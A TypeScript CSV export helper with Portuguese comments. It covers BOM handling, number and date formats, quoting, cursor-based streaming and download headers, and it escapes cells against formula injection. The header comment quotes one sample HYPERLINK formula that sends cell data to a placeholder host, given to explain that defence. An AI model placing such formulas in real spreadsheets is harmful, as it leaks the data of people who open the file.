import { Readable } from 'stream';

// O CSV QUE SAI DO SISTEMA (F10, Etapa C) — e as quatro regras que o fazem
// sobreviver ao Excel em português e à volta pelo importador.
//
// MORA EM `domain/shared/` E NÃO EM `domain/report/helpers/`, como o plano da
// F10 escreveu. O motivo apareceu na primeira linha de código: quem exporta é
// CADA domínio (`/api/assets/export`, `/api/licenses/export`), e o mapa de
// colunas de cada um mora no domínio dono das colunas — é o que a revisão da F8
// aprendeu com o `ATIVO_NO_PARQUE`. Com o arquivo em `report/`, `asset` e
// `license` passariam a importar `report` para escrever um CSV, uma seta que o
// ARQUITETURA.md não desenha. Aqui ele é o que de fato é: formato de arquivo,
// sem conhecimento de negócio nenhum — vizinho do `multipart.helper.ts`, que
// chegou em `shared/` pelo mesmo caminho.
//
// ═════════════════════════════════════════════════════════════════════════════
// 1. O BOM (`\uFEFF`, os bytes `EF BB BF`) NO COMEÇO DO ARQUIVO.
//
// Sem ele, o Excel em pt-BR abre o arquivo como Windows-1252 e todo acento sai
// quebrado — "Localização" vira "LocalizaÃ§Ã£o". É a razão que o TODO declara, e
// ela vale mesmo com `charset=utf-8` no cabeçalho HTTP: o Excel ignora o
// cabeçalho quando o arquivo é aberto do disco, que é o caminho normal.
//
// E ELE É ARMADILHA DO OUTRO LADO: na IMPORTAÇÃO o BOM tem de ser REMOVIDO,
// senão o primeiro cabeçalho vira `"\uFEFFEtiqueta"`, o mapeamento perde a
// primeira coluna e o importador diz que o arquivo não tem etiqueta — com a
// etiqueta ali, visível, na tela.
//
// 2. NÚMERO CRU, COM PONTO DECIMAL (D69).
//
// `1234.50`, nunca `1.234,50`. O export é a ENTRADA do importador, e um
// `1.234,50` volta como lixo no round-trip. O custo está aceito e é conhecido:
// o Excel em pt-BR mostra a coluna como texto até alguém convertê-la.
//
// 3. DATA EM `AAAA-MM-DD`.
//
// Mesma razão: `01/10/2026` é 1º de outubro aqui e 10 de janeiro em outro
// lugar, e o importador não tem como saber qual dos dois chegou.
//
// 4. VALOR QUE COMEÇA COM `=`, `+`, `-` ou `@` É PREFIXADO.
//
// Uma célula `=1+1` é fórmula ao abrir; uma célula
// `=HYPERLINK("http://x/?"&A1)` é exfiltração de dado com um clique. O prefixo
// é um apóstrofo, que o Excel trata como "isto é texto".
//
// ⚠️ A ESCAPADA VALE SÓ PARA TEXTO, e a ordem no `celula()` é o que garante
// isso: número NEGATIVO começa com `-`, e um apóstrofo na frente de `-1234.50`
// quebraria exatamente a regra 2. Quem mexer aqui precisa manter a conversão de
// número ANTES da escapada de texto.
// ═════════════════════════════════════════════════════════════════════════════

export const BOM = '\uFEFF';

/** O que o Excel trataria como início de fórmula. */
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/;

/** Caracteres que obrigam a célula a ir entre aspas. */
const PRECISA_DE_ASPAS = /["\n\r]/;

export interface ColunaCsv<T> {
  /** O título que vai no cabeçalho — e que o importador vai casar na volta. */
  titulo: string;
  valor: (linha: T) => unknown;
}

/**
 * O que o Prisma devolve numa coluna `Decimal`: um `Decimal.js`, que tem
 * `toFixed` e cujo `toString` já sai com ponto decimal.
 *
 * SEM predicado de tipo (`valor is …`) de propósito: um predicado aqui estreita
 * o ramo FALSO para "tudo menos objeto com toString" — e `Date` tem `toString`,
 * então o caso de data abaixo passava a ser inalcançável para o compilador.
 */
function ehDecimal(valor: object): boolean {
  return 'toFixed' in valor && typeof (valor as { toFixed: unknown }).toFixed === 'function';
}

/**
 * Um valor virando célula.
 *
 * A ORDEM DOS CASOS É A REGRA (ver o cabeçalho): número e data saem antes de
 * qualquer coisa tocar em texto.
 */
export function celula(valor: unknown, delimitador: string): string {
  if (valor === null || valor === undefined) return '';

  // NÚMERO — ponto decimal, sem separador de milhar, sem apóstrofo. Inclui o
  // negativo, que é o caso que a escapada de fórmula estragaria.
  if (typeof valor === 'number') return Number.isFinite(valor) ? String(valor) : '';
  if (typeof valor === 'bigint') return String(valor);

  // DATA — dia de calendário em ISO. Toda data que este sistema exporta é dia,
  // não instante: compra, garantia, fim de vida, descomissionamento. Quem
  // precisar de hora passa a string já formatada na própria coluna.
  if (valor instanceof Date) return valor.toISOString().slice(0, 10);

  if (typeof valor === 'object' && ehDecimal(valor)) return String(valor);

  // BOOLEANO — `true`/`false`, que é como o importador e o `customFields` da F9
  // já guardam booleano em texto.
  if (typeof valor === 'boolean') return valor ? 'true' : 'false';

  const texto = String(valor);
  const escapado = INICIO_DE_FORMULA.test(texto) ? `'${texto}` : texto;

  if (escapado.includes(delimitador) || PRECISA_DE_ASPAS.test(escapado)) {
    return `"${escapado.replace(/"/g, '""')}"`;
  }
  return escapado;
}

export function linha<T>(registro: T, colunas: ColunaCsv<T>[], delimitador: string): string {
  return colunas.map((coluna) => celula(coluna.valor(registro), delimitador)).join(delimitador);
}

export function cabecalho<T>(colunas: ColunaCsv<T>[], delimitador: string): string {
  return colunas.map((coluna) => celula(coluna.titulo, delimitador)).join(delimitador);
}

export interface OpcoesDeExport<T> {
  colunas: ColunaCsv<T>[];
  delimitador: string;
  /**
   * Um lote a partir do cursor. Devolve `[]` quando não há mais nada.
   *
   * CURSOR, e não `skip`/`take`: com `OFFSET` o banco relê e descarta as linhas
   * já enviadas a cada lote — o último lote de um export de 50 mil linhas
   * custaria a varredura inteira. E paginar por offset enquanto alguém cadastra
   * ativo DUPLICA ou PERDE linha, porque a janela desliza.
   */
  lote: (cursor: string | null) => Promise<T[]>;
  /** O cursor da última linha do lote. */
  cursorDe: (linha: T) => string;
}

/**
 * O CSV como stream.
 *
 * POR QUE STREAM, E NÃO UMA STRING: montar o arquivo inteiro em memória é
 * negação de serviço acidental — dois cliques em "exportar tudo" num parque de
 * 50 mil ativos são duas respostas inteiras na heap de um processo só. Com
 * stream, a memória é de um lote.
 *
 * `Readable.from` com um gerador assíncrono: o `reply.send(stream)` do Fastify
 * consome sob demanda, então o banco só é consultado na velocidade em que o
 * cliente lê.
 */
export function csvStream<T>({ colunas, delimitador, lote, cursorDe }: OpcoesDeExport<T>): Readable {
  async function* gerar() {
    yield `${BOM}${cabecalho(colunas, delimitador)}\r\n`;

    let cursor: string | null = null;
    for (;;) {
      const registros = await lote(cursor);
      if (registros.length === 0) return;

      // Um `yield` por LOTE, e não por linha: cada `yield` é um chunk no stream,
      // e um chunk por linha num arquivo de 50 mil linhas são 50 mil escritas
      // de ~200 bytes no socket.
      yield registros.map((registro) => linha(registro, colunas, delimitador)).join('\r\n') + '\r\n';

      cursor = cursorDe(registros[registros.length - 1]);
    }
  }

  return Readable.from(gerar());
}

/**
 * Os cabeçalhos da resposta de download.
 *
 * `filename*=UTF-8''…` além do `filename=`: o nome tem acento ("ativos" não,
 * mas "licenças" sim), e sem a forma estendida o navegador grava o arquivo com
 * o nome quebrado. Os dois vão juntos porque cliente antigo só entende o
 * primeiro — é o que a RFC 6266 recomenda.
 */
export function cabecalhosDeCsv(nomeBase: string, agora: Date = new Date()): Record<string, string> {
  const nome = `${nomeBase}-${agora.toISOString().slice(0, 10)}.csv`;

  return {
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': `attachment; filename="${nome.normalize('NFD').replace(/[̀-ͯ]/g, '')}"; `
      + `filename*=UTF-8''${encodeURIComponent(nome)}`,
    // A resposta passou por sessão e pode conter custo de compra: nenhum proxy
    // guarda isto.
    'Cache-Control': 'private, max-age=0, no-store',
  };
}
